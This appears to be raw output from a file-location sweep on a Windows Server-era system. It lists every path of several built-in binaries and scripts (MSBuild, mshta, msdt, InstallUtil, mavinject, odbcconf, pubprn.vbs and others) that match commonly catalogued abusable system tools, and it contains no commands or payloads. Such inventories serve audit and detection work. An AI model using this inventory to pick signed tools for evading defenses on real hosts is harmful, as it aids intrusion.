Path: C:\Windows\WinSxS\wow64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.17763.1_none_67af17f7289997f0\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_installutil_b03f5f7f11d50a3a_4.0.15713.0_none_d4948e9d0f25af26\InstallUtil.exe
Path: C:\Windows\WinSxS\x86_installutil_b03f5f7f11d50a3a_4.0.15713.0_none_1c41c57423a1d82c\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Path: C:\Windows\WinSxS\amd64_jsc_b03f5f7f11d50a3a_4.0.15713.0_none_00f10a3ec57c2b75\jsc.exe
Path: C:\Windows\WinSxS\x86_jsc_b03f5f7f11d50a3a_4.0.15713.0_none_489e4115d9f8547b\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
Path: C:\Windows\System32\makecab.exe
Path: C:\Windows\SysWOW64\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_3e76707d3afacc5e\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1_none_e1956bcbc16844da\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_48cb1acf6f5b8e59\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1_none_ebea161df5c906d5\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_3e76707d3afacc5e\f\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_3e76707d3afacc5e\r\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_48cb1acf6f5b8e59\f\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_48cb1acf6f5b8e59\r\makecab.exe
Path: C:\Windows\System32\mavinject.exe
Path: C:\Windows\SysWOW64\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.1_none_a3ffb62d4a90311f\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_00da7e48c42691ed\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.1_none_ae54607f7ef0f31a\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_0b2f289af88753e8\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_00da7e48c42691ed\f\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_00da7e48c42691ed\r\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_0b2f289af88753e8\f\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_0b2f289af88753e8\r\mavinject.exe
Path: C:\Windows\WinSxS\amd64_netfx4-microsoft.workflow.compiler_b03f5f7f11d50a3a_4.0.15713.0_none_582c8c015167cad5\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\WinSxS\msil_microsoft.workflow.compiler_31bf3856ad364e35_4.0.15713.0_none_31438b4fdc7273c6\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\v4.0_4.0.0.0__31bf3856ad364e35\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\System32\mmc.exe
Path: C:\Windows\SysWOW64\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.1_none_003934f5cdcbaab6\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_5ccd47774797eab7\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.1_none_0a8ddf48022c6cb1\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_6721f1c97bf8acb2\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_5ccd47774797eab7\f\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_5ccd47774797eab7\r\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_6721f1c97bf8acb2\f\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_6721f1c97bf8acb2\r\mmc.exe
Path: C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15713.0_none_da500ddf9f3ce843\MSBuild.exe
Path: C:\Windows\WinSxS\x86_msbuild_b03f5f7f11d50a3a_4.0.15713.0_none_21fd44b6b3b91149\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\System32\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.1_none_cb402868f5e97c8d\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.2061_none_282d9eae6f724b37\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.2061_none_282d9eae6f724b37\f\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.2061_none_282d9eae6f724b37\r\msconfig.exe
Path: C:\Program Files\IIS\Microsoft Web Deploy V3\msdeploy.exe
Path: C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe
Path: C:\Windows\System32\msdt.exe
Path: C:\Windows\SysWOW64\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.1_none_96484bd875afe57a\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_f330db3fef3d161e\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.1_none_a09cf62aaa10a775\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_fd858592239dd819\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_f330db3fef3d161e\f\msdt.exe
PPath: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_fd858592239dd819\f\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_fd858592239dd819\r\msdt.exe
Path: C:\Windows\System32\mshta.exe
Path: C:\Windows\SysWOW64\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.17763.1_none_7e1153fecc60d8b3\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.17763.1_none_8865fe5100c19aae\mshta.exe
Path: C:\Windows\System32\mshtml.dll
Path: C:\Windows\SysWOW64\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_a38ada00ad8aaa65\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_addf8452e1eb6c60\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_a38ada00ad8aaa65\f\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_a38ada00ad8aaa65\r\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_addf8452e1eb6c60\f\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_addf8452e1eb6c60\r\mshtml.dll
Path: C:\Windows\System32\msiexec.exe
Path: C:\Windows\SysWOW64\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.1_none_3a475eb1de434ea1\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_96f1b44f57fed974\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.1_none_449c090412a4109c\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_a1465ea18c5f9b6f\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_96f1b44f57fed974\f\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_96f1b44f57fed974\r\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_a1465ea18c5f9b6f\f\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_a1465ea18c5f9b6f\r\msiexec.exe
Path: C:\Windows\System32\netsh.exe
Path: C:\Windows\SysWOW64\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-netsh_31bf3856ad364e35_10.0.17763.1_none_5066e02350023e4e\netsh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-netsh_31bf3856ad364e35_10.0.17763.1_none_5abb8a7584630049\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.1_none_cc17025f87bcc81a\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_28f1ca7b015328e8\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.1_none_6ff866dbcf5f56e4\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_ccd32ef748f5b7b2\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_28f1ca7b015328e8\f\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_28f1ca7b015328e8\r\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_ccd32ef748f5b7b2\f\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_ccd32ef748f5b7b2\r\ntdsutil.exe
Path: C:\Windows\System32\odbcconf.exe
Path: C:\Windows\SysWOW64\odbcconf.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.17763.1_none_fe3cc4624a46a1fe\odbcconf.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.17763.1_none_a21e28de91e930c8\odbcconf.exe
Path: C:\Windows\System32\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.1_none_248c6ff97b506e26\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.4492_none_81519470f4f70c88\pcalua.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.4492_none_81519470f4f70c88\f\pcalua.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.4492_none_81519470f4f70c88\r\pcalua.exe
Path: C:\Windows\System32\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.1_none_e5f1b7c957d1804f\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\pcwrun.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\f\pcwrun.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\r\pcwrun.exe
Path: C:\Windows\System32\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.1_none_e5f1b7c957d1804f\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\pcwutl.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\f\pcwutl.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\r\pcwutl.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_21e48dc545843e2d\f\pester.bat
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_21e48dc545843e2d\r\pester.bat
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_2c39381779e50028\f\pester.bat
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_2c39381779e50028\r\pester.bat
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.1_none_c4f85489cbfa475b\Pester.bat
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_21e48dc545843e2d\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.1_none_cf4cfedc005b0956\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_2c39381779e50028\Pester.bat
Path: C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Windows\System32\PresentationHost.exe
Path: C:\Windows\SysWOW64\PresentationHost.exe
Path: C:\Windows\WinSxS\amd64_wpf-presentationhostexe_31bf3856ad364e35_10.0.17763.1_none_60ba1d3678474a35\PresentationHost.exe
Path: C:\Windows\WinSxS\x86_wpf-presentationhostexe_31bf3856ad364e35_10.0.17763.1_none_049b81b2bfe9d8ff\PresentationHost.exe
Path: C:\Windows\System32\print.exe
Path: C:\Windows\SysWOW64\print.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_6de2d78cbf7e0077\print.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_783781def3dec272\print.exe
Path: C:\Windows\System32\psr.exe
Path: C:\Windows\SysWOW64\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_286688171cda8dde\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1_none_cbb77b11a3232eea\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_32bb3269513b4fd9\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1_none_d60c2563d783f0e5\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_286688171cda8dde\f\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_286688171cda8dde\r\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_32bb3269513b4fd9\f\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_32bb3269513b4fd9\r\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_5c075c5d1e45fe79\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.1_en-us_09c7f42dd8da8073\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_665c06af52a6c074\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_ffe8c0d965e88d43\pubprn.vbs
Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_5c075c5d1e45fe79\f\pubprn.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_5c075c5d1e45fe79\r\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_665c06af52a6c074\f\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_665c06af52a6c074\r\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_ffe8c0d965e88d43\f\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_ffe8c0d965e88d43\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_18b11101374ba21b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_18b11101374ba21b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_b5eaf1282d919e1a\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_b5eaf1282d919e1a\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_b31686642f67f2b4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_b31686642f67f2b4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_5bacb3f71e7d5b42\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_5bacb3f71e7d5b42\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_5bd2b9411e6cf01e\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_5bd2b9411e6cf01e\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_faedbdee1386e248\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_faedbdee1386e248\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_fe8a2f40113f0680\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_fe8a2f40113f0680\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_45faaf87f59ed59c\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_hu-hu_45faaf87f59ed59c\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_e8b22586e870ebfe\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_it-it_e8b22586e870ebfe\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_8ad7a493db8bfdd9\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ja-jp_8ad7a493db8bfdd9\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_2e418148cdfcc4ef\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_ko-kr_2e418148cdfcc4ef\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_16d4027da621f0ab\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nb-no_16d4027da621f0ab\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_15134dbba74dfa80\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_nl-nl_15134dbba74dfa80\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_5b4fa83d8c706834\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pl-pl_5b4fa83d8c706834\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_5da392e18af9fc18\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-br_5da392e18af9fc18\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_pt-pt_5e85624d8a696bf4\f\pubprn.vbs
